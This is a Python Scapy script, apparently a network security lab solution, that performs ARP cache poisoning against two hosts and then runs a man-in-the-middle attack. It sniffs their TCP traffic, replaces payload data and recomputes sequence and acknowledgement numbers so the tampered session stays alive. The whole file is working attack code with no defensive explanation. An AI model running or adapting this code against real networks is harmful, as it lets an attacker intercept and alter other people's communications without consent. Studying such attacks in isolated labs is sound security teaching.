from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *


class Task:
    @staticmethod
    def _1A():
        FAKE_IP = "10.9.0.17"
        FAKE_MAC = "aa:bb:cc:dd:ee:ff"

        TARGET_MAC = "b2:8d:95:83:4a:08"

        pkt = Ether() / ARP(
            hwsrc=FAKE_MAC,
            psrc=FAKE_IP,
            hwdst=TARGET_MAC,
            pdst="10.9.0.5",
            op=2,
        )

        sendp(pkt)

    @staticmethod
    def _1B():
        FAKE_IP = "10.9.0.17"
        FAKE_MAC = "aa:bb:cc:dd:ee:ff"

        TARGET_MAC = "b2:8d:95:83:4a:08"

        pkt = Ether(src=FAKE_MAC, dst=TARGET_MAC) / ARP(
            hwsrc=FAKE_MAC,
            psrc=FAKE_IP,
            hwdst=TARGET_MAC,
            pdst="10.9.0.5",
            op=2,
        )

        sendp(pkt)

    @staticmethod
    def _1C():
        FAKE_IP = "10.9.0.17"
        FAKE_MAC = "aa:bb:cc:dd:ee:ff"

        pkt = Ether(src=FAKE_MAC, dst="ff:ff:ff:ff:ff:ff") / ARP(
            hwsrc=FAKE_MAC,
            psrc=FAKE_IP,
            hwdst="00:00:00:00:00:00",
            pdst="10.9.0.5",
            op=2,
        )

        sendp(pkt)

    @staticmethod
    def _2():

        def poison_cache_for(target_ip, fake_ip, fake_mac):
            pkt = Ether() / ARP(
                hwsrc=fake_mac,
                psrc=fake_ip,
                hwdst="00:00:00:00:00:00",
                pdst=target_ip,
                op=1,
            )

            sendp(pkt, verbose=False)

        HOSTA = "10.9.0.5"
        HOSTB = "10.9.0.6"

        ATTACKER_MAC = "aa:50:5a:7f:ae:1d"

        poison_cache_for(HOSTA, HOSTB, ATTACKER_MAC)
        poison_cache_for(HOSTB, HOSTA, ATTACKER_MAC)

    @staticmethod
    def _3():
        HOSTA = "10.9.0.5"
        HOSTB = "10.9.0.6"
        INTERFACE = "eth0"
        ATTACKER_MAC = "aa:50:5a:7f:ae:1d"

        # Track cumulative length difference caused by payload replacement
        delta_a_to_b = 0  # Bytes added/removed in A -> B stream
        delta_b_to_a = 0  # Bytes added/removed in B -> A stream

        def spoof_to_b(pkt, new_data):
            nonlocal delta_a_to_b, delta_b_to_a

            if TCP not in pkt or IP not in pkt or pkt[Ether].src == ATTACKER_MAC:
                return

            has_payload = Raw in pkt and len(pkt[Raw].load) > 0
            orig_len = len(pkt[Raw].load) if has_payload else 0

            # SEQ uses A->B delta; ACK acknowledges B->A data (uses B->A delta)
            adjusted_seq = (pkt[TCP].seq + delta_a_to_b) % (2**32)
            adjusted_ack = (pkt[TCP].ack - delta_b_to_a) % (2**32)

            spoofpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(
                sport=pkt[TCP].sport,
                dport=pkt[TCP].dport,
                seq=adjusted_seq,
                ack=adjusted_ack,
                flags=pkt[TCP].flags,
            )

            # Modify payload ONLY if original packet contained data
            if has_payload:
                spoofpkt /= Raw(load=new_data)
                delta_a_to_b += len(new_data) - orig_len

            send(spoofpkt, verbose=False)

        def spoof_to_a(pkt, new_data):
            nonlocal delta_a_to_b, delta_b_to_a

            if TCP not in pkt or IP not in pkt or pkt[Ether].src == ATTACKER_MAC:
                return

            has_payload = Raw in pkt and len(pkt[Raw].load) > 0
            orig_len = len(pkt[Raw].load) if has_payload else 0

            # SEQ uses B->A delta; ACK acknowledges A->B data (uses A->B delta)
            adjusted_seq = (pkt[TCP].seq + delta_b_to_a) % (2**32)
            adjusted_ack = (pkt[TCP].ack - delta_a_to_b) % (2**32)

            spoofpkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(
                sport=pkt[TCP].sport,
                dport=pkt[TCP].dport,
                seq=adjusted_seq,
                ack=adjusted_ack,
                flags=pkt[TCP].flags,
            )

            if has_payload:
                spoofpkt /= Raw(load=new_data)
                delta_b_to_a += len(new_data) - orig_len

            send(spoofpkt, verbose=False)

        def mitm(pkt):
            if IP in pkt and pkt[IP].src == HOSTA:
                spoof_to_b(pkt, "sumedh\n")
            elif IP in pkt and pkt[IP].src == HOSTB:
                spoof_to_a(pkt, "sumit\n")

            Task._2()

        _ = sniff(iface=INTERFACE, prn=mitm)


if __name__ == "__main__":
    for _ in range(10):
        Task._2()
    Task._3()
